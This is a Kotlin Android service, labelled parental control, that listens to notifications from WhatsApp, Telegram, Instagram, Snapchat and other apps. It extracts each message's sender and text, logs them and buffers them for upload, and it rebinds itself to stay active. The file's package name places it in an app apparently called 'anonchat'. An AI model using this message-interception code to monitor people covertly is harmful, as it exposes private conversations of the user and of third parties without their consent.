package com.anonchat.app.parentalcontrol.service

import android.app.Notification
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue

class SocialNotificationService : NotificationListenerService() {

    companion object {
        private const val TAG = "SocialNotification"

        // Social media packages to track
        private val SOCIAL_PACKAGES = mapOf(
            "com.whatsapp" to "WhatsApp",
            "com.whatsapp.w4b" to "WhatsApp Business",
            "com.instagram.android" to "Instagram",
            "com.facebook.katana" to "Facebook",
            "com.facebook.orca" to "Messenger",
            "com.facebook.lite" to "Facebook Lite",
            "com.snapchat.android" to "Snapchat",
            "org.telegram.messenger" to "Telegram",
            "com.google.android.youtube" to "YouTube",
            "com.zhiliaoapp.musically" to "TikTok",
            "com.twitter.android" to "X (Twitter)",
            "com.discord" to "Discord",
            "com.pinterest" to "Pinterest",
            "com.reddit.frontpage" to "Reddit",
            "com.linkedin.android" to "LinkedIn",
            "com.viber.voip" to "Viber",
            "jp.naver.line.android" to "LINE",
            "com.skype.raider" to "Skype"
        )

        // Buffer for batching
        private val notificationBuffer = ConcurrentLinkedQueue<JSONObject>()

        @Volatile
        var instance: SocialNotificationService? = null
            private set

        fun isEnabled(context: Context): Boolean {
            val cn = ComponentName(context, SocialNotificationService::class.java)
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains(cn.flattenToString())
        }

        fun openSettings(context: Context) {
            val intent = android.content.Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        }

        fun ensureRebound(context: Context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                if (instance == null && isEnabled(context)) {
                    try {
                        val cn = ComponentName(context, SocialNotificationService::class.java)
                        requestRebind(cn)
                        Log.d(TAG, "Requested rebind for SocialNotificationService")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to request rebind: ${e.message}")
                    }
                }
            }
        }

        fun flushBuffer(): List<JSONObject> {
            val list = mutableListOf<JSONObject>()
            while (notificationBuffer.isNotEmpty()) {
                notificationBuffer.poll()?.let { list.add(it) }
            }
            return list
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this
        Log.d(TAG, "SocialNotificationService connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        if (instance == this) instance = null
        Log.d(TAG, "SocialNotificationService disconnected")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                requestRebind(ComponentName(this, SocialNotificationService::class.java))
            } catch (_: Exception) {}
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!TrackerService.isRunning) return

        val packageName = sbn.packageName ?: return
        val appName = SOCIAL_PACKAGES[packageName] ?: return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        try {
            // Skip ongoing/persistent notifications (e.g., "WhatsApp Web is active")
            if (notification.flags and Notification.FLAG_ONGOING_EVENT != 0) return

            val (sender, content) = extractDetailedContent(notification, extras)

            // Skip empty notifications
            if (sender.isBlank() && content.isBlank()) return

            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()

            // Determine message type
            val messageType = when {
                packageName.contains("whatsapp") || packageName.contains("telegram") ||
                packageName.contains("orca") || packageName.contains("viber") -> "message"
                packageName.contains("instagram") && content.contains("liked") -> "like"
                packageName.contains("instagram") && content.contains("commented") -> "comment"
                packageName.contains("instagram") && content.contains("sent") -> "dm"
                packageName.contains("instagram") -> "notification"
                packageName.contains("youtube") -> "video"
                packageName.contains("snapchat") -> "snap"
                else -> "notification"
            }

            // Build notification data
            val data = JSONObject().apply {
                put("package_name", packageName)
                put("app_name", appName)
                put("sender", sender)
                put("content", content.take(500)) // Limit to 500 chars
                put("message_type", messageType)
                put("sub_text", subText ?: "")
                put("timestamp", if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis())
                put("notification_id", sbn.id)
            }

            notificationBuffer.add(data)
            Log.d(TAG, "Captured $appName notification from: $sender - $content")

        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification: ${e.message}")
        }
    }

    private fun extractDetailedContent(notification: Notification, extras: android.os.Bundle): Pair<String, String> {
        var sender = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        var content = ""

        // 1. Try MessagingStyle extra "android.messages" (WhatsApp, Telegram, Messenger)
        val messagesParcelables = extras.getParcelableArray("android.messages")
        if (messagesParcelables != null && messagesParcelables.isNotEmpty()) {
            val lastMsgBundle = messagesParcelables.last() as? android.os.Bundle
            if (lastMsgBundle != null) {
                val msgText = lastMsgBundle.getCharSequence("text")?.toString()
                val msgSender = lastMsgBundle.getCharSequence("sender")?.toString()
                if (!msgText.isNullOrBlank()) {
                    content = msgText
                }
                if (!msgSender.isNullOrBlank()) {
                    sender = msgSender
                }
            }
        }

        // 2. Try EXTRA_TEXT_LINES (InboxStyle)
        if (content.isBlank()) {
            val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            if (lines != null && lines.isNotEmpty()) {
                content = lines.lastOrNull { !it.isNullOrBlank() }?.toString() ?: ""
            }
        }

        // 3. Try EXTRA_BIG_TEXT
        if (content.isBlank()) {
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            if (!bigText.isNullOrBlank()) {
                content = bigText
            }
        }

        // 4. Try standard EXTRA_TEXT
        if (content.isBlank()) {
            content = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        }

        // 5. Try EXTRA_TITLE_BIG
        if (sender.isBlank()) {
            sender = extras.getCharSequence(Notification.EXTRA_TITLE_BIG)?.toString() ?: ""
        }

        return Pair(sender, content)
    }

}
